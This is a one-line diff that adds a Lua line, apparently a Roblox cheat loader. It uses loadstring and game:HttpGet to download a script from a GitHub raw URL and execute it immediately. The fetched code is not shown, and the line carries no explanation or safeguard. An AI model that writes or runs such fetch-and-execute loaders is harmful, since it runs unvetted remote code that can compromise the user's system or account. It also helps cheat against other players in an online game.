@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/build-a-base-steal-plants-co-op-spam7-na7z6e42i95ug4.lua"))()
